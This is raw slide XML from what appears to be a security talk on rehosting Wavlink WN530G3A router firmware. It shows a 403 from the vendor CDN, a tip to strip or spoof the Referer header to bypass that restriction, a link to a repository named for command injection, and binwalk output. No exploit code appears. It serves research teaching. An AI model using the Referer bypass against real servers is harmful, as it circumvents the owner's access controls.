          <a:xfrm>
            <a:off x="228600" y="234750"/>
            <a:ext cx="8082600" cy="4980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100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>General Rehosting Steps</a:t>
            </a:r>
            <a:endParaRPr sz="3100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="182" name="Google Shape;182;p23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="271675" y="778000"/>
            <a:ext cx="8595300" cy="36555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Char char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Pick a target </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Obtain the firmware</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Unpack the firmware</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Figure out how the device boots</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>What processes are started?</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>What order do processes need to be started in?</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>What services are typically exposed out of the box?</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Begin analysis / fuzzing</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Profit?</a:t>
            </a:r>
            <a:endParaRPr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4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="126950" y="188573"/>
            <a:ext cx="3655800" cy="9297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200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Obtaining the Firmware :(</a:t>
            </a:r>
            <a:endParaRPr sz="3200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="188" name="Google Shape;188;p24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="126950" y="4679825"/>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pic>
        <p:nvPicPr>
          <p:cNvPr id="189" name="Google Shape;189;p24"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6143143" y="290450"/>
            <a:ext cx="2870762" cy="2853150"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="190" name="Google Shape;190;p24"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5758800" y="3298154"/>
            <a:ext cx="3255101" cy="1223275"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="191" name="Google Shape;191;p24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="126950" y="1092175"/>
            <a:ext cx="5486100" cy="35064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Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>GET /drivers/fw/WN530G3A_20230616_WAVLINK_M30G3_V230616.bin HTTP/2</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Host: files2.wavlink.com</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Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"</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Sec-Ch-Ua-Mobile: ?0</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Sec-Ch-Ua-Platform: "Linux"</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Accept-Language: en-US,en;q=0.9</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Upgrade-Insecure-Requests: 1</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User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</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Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</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Sec-Fetch-Site: cross-site</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Sec-Fetch-Mode: navigate</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Sec-Fetch-User: ?1</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Sec-Fetch-Dest: document</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Referer: https://docs.wavlink.xyz/</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Accept-Encoding: gzip, deflate, br</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Priority: u=0, i</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Connection: keep-alive</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HTTP/2 403 Forbidden</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Server: Tengine</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Date: Sun, 10 Aug 2025 21:28:16 GMT</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Content-Type: text/html; charset=utf-8</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X-Tengine-Error: denied by Referer ACL</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Cache_control: no-cache, no-store</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Pragma: no-cache</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Via: ens-cache4.us33[,403003]</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Timing-Allow-Origin: *</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Eagleid: a3b5f69817548612963588758e</a:t>
            </a:r>
            <a:endParaRPr sz="600">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="600">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="600">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;p&gt;You don't have permission to access the URL on this server.&lt;/p&gt;&lt;p&gt;denied by Referer ACL&lt;/p&gt;&lt;hr/&gt;Powered by Tengine &lt;br/&gt;CDN Request Id: a3b5f69817548612963588758e&lt;/body&gt;&lt;/html&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="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600">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="600">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="192" name="Google Shape;192;p24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6846675" y="3859675"/>
            <a:ext cx="1463700" cy="2535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24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4066296" y="1118274"/>
            <a:ext cx="1546748" cy="36985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Request</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="194" name="Google Shape;194;p24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4066300" y="3004375"/>
            <a:ext cx="1546750" cy="36985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Response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5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6859200" y="4683725"/>
            <a:ext cx="2056500" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>2025</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="200" name="Google Shape;200;p25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="290450"/>
            <a:ext cx="7545000" cy="4980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100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Obtaining the Firmware :)</a:t>
            </a:r>
            <a:endParaRPr sz="3100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="201" name="Google Shape;201;p25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4679825"/>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pic>
        <p:nvPicPr>
          <p:cNvPr id="202" name="Google Shape;202;p25" title="2025-09-11 19-23-57.mkv">
            <a:hlinkClick r:id="rId3"/>
          </p:cNvPr>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="470412" y="705875"/>
            <a:ext cx="8203176" cy="38571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idx="5" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6859050" y="4602425"/>
            <a:ext cx="2056500" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>2025</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="208" name="Google Shape;208;p26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228450" y="209150"/>
            <a:ext cx="8632200" cy="510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200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Recap: Firmware Spelunking</a:t>
            </a:r>
            <a:endParaRPr sz="3200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="209" name="Google Shape;209;p26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="6" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228450" y="928125"/>
            <a:ext cx="8632200" cy="3443400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="95000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1018"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1325">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>To Recap:</a:t>
            </a:r>
            <a:endParaRPr sz="1325">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-312737" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1325"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1325">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Browse to the target website</a:t>
            </a:r>
            <a:endParaRPr sz="1325">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-312737" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1325"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1325">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>If you encounter a 403 Forbidden</a:t>
            </a:r>
            <a:endParaRPr sz="1325">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-312737" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1325"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1325">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Simply remove the </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1325">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Referer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1325">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>header</a:t>
            </a:r>
            <a:endParaRPr sz="1325">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-312737" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1325"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1325">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Or set the </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1325">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Referer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1325">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>header to: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1325" u="sng">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>files2.wavlink.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1325">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> and it will </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1325">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>bypass the ACL restriction</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1325">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-312737" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1325"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1325">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The ACL protected firmware is located in my Github Repository: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1325" u="sng">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId4">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>https://github.com/ice-wzl/Wavlink-WN530G3A-Cmd-Injection</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1325">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-312737" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1325"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1325">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>WN530G3A_20230616_WAVLINK_M30G3_V230616.bin</a:t>
            </a:r>
            <a:endParaRPr sz="1325">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="210" name="Google Shape;210;p26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228450" y="4736975"/>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7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4716590" y="4533675"/>
            <a:ext cx="22947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None/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Quarter Month</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="216" name="Google Shape;216;p27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6859050" y="4541425"/>
            <a:ext cx="2056500" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Year</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="217" name="Google Shape;217;p27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228450" y="148150"/>
            <a:ext cx="86868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solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Unpacking and Rehosting</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="218" name="Google Shape;218;p27"/>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
        <p:nvSpPr>
          <p:cNvPr id="219" name="Google Shape;219;p27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="431550" y="1572450"/>
            <a:ext cx="8186700" cy="25320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oboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>sudo binwalk --run-as=root --preserve-symlinks -e WN530G3A_20230616_WAVLINK_M30G3_V230616.bin             130 ↵</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DECIMAL       HEXADECIMAL     DESCRIPTION</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64            0x40            LZMA compressed data, properties: 0x6D, dictionary size: 8388608 bytes, uncompressed size: 6370112 bytes</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1979489       0x1E3461        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 5065865 bytes, 1231 inodes, blocksize: 262144 bytes, created: 2023-04-03 04:34:35</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WARNING: One or more files failed to extract: either no utility was found or it's unimplemented</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="220" name="Google Shape;220;p27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="358275" y="1022600"/>
            <a:ext cx="8186700" cy="7305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Urbanist"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
